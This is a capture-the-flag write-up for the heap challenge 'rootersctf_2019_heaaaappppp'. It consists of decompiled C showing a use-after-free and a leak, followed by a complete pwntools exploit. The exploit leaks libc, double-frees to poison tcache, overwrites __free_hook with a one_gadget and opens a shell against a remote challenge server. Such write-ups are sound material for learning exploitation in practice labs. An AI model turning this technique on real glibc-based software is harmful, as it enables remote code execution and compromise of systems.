# rootersctf_2019_heaaaappppp

## 漏洞
```c
void deleteUser()
{
  if ( !heap_ptr )
    bye();
  free(heap_ptr);                               // uaf
}
```

```c
void __fastcall sendMessage()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v1; // [rsp+88h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("Enter message to be sent: ");
  read(0, buf, 0x7FuLL);
  puts("Message recieved: ");
  puts(buf);
  puts("\nSaving it for admin to see!\n");
  message = (__int64)strdup(buf);
}
```

uaf，可以通过sendMessage来leak

## exp

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './rootersctf_2019_heaaaappppp'

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

context.terminal = ['tmux','splitw','-h']

debug = 1
if debug:
    r = remote('node4.buuoj.cn', 29737)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

def dbgg():
    raw_input()

menu = b'Enter your choice: '

def add(payload):
    r.sendlineafter(menu, '0')
    r.sendlineafter("user: ",'0')
    r.sendafter("username: ",payload)

def edit(payload):
    r.sendlineafter(menu,'1')
    r.sendlineafter("user: ",'0')
    r.sendafter("username: ",payload)

def delete():
    r.sendlineafter(menu,'2')

def sendMessage(payload):
    r.sendlineafter(menu,'3')
    r.sendafter("sent: \n",payload)

r.sendlineafter(menu, '3')
r.sendafter('Enter message to be sent: ', b'a' * 0x68)
leak_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
li('leak_addr = ' + hex(leak_addr))
libc = ELF('./2.27/libc-2.27.so')
libc_base = leak_addr - libc.sym['puts'] - 418
li('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
one = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget = libc_base + one[1]

add('a')
delete()
delete()
sendMessage(p64(free_hook))
add(p64(one_gadget))
sendMessage(p64(one_gadget))
delete()

r.interactive()
```